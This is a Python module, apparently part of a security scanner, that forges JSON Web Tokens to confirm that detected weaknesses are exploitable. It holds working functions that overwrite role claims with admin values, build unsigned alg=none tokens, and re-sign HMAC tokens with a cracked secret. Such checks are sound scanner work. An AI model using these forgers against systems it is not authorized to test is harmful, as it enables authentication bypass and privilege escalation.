"""Forge JWTs to prove a detected weakness is exploitable.

Pure (stdlib only), so it's unit-testable. Used by the JWT analyzer to turn
"this token looks forgeable" into "a forged token is accepted" by replaying it
read-only, in scope.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any, Dict, Optional, Tuple

_HS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# Claims an attacker flips to escalate privilege.
_ELEVATE = {"role": "admin", "roles": ["admin"], "is_admin": True,
            "isAdmin": True, "admin": True, "scope": "admin",
            "permissions": ["admin"], "tier": "admin"}


def _b64url(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def decode_parts(token: str) -> Tuple[Optional[dict], Optional[dict]]:
    try:
        h, p, _sig = token.split(".")
        header = json.loads(_b64url(h))
        payload = json.loads(_b64url(p))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None, None
        return header, payload
    except Exception:  # noqa: BLE001
        return None, None


def elevate(payload: Dict[str, Any]) -> Dict[str, Any]:
    """Return a copy of the payload with privileged claims set (only those that
    already exist are overwritten; we don't invent unrelated claims)."""
    out = dict(payload)
    for k, v in _ELEVATE.items():
        if k in out:
            out[k] = v
    # If none of the known role claims exist, add the two most common ones.
    if not any(k in payload for k in _ELEVATE):
        out["role"] = "admin"
        out["is_admin"] = True
    return out


def _encode(header: Dict[str, Any], payload: Dict[str, Any]) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}"


def forge_none(payload: Dict[str, Any]) -> str:
    """alg=none token (empty signature)."""
    return _encode({"alg": "none", "typ": "JWT"}, payload) + "."


def forge_hs(header: Dict[str, Any], payload: Dict[str, Any], secret: str) -> str:
    """Re-sign an HS* token with a (cracked) secret."""
    alg = str(header.get("alg", "HS256")).upper()
    digest = _HS.get(alg, hashlib.sha256)
    signing_input = _encode(header, payload)
    sig = hmac.new(secret.encode(), signing_input.encode(), digest).digest()
    return f"{signing_input}.{_b64url_encode(sig)}"
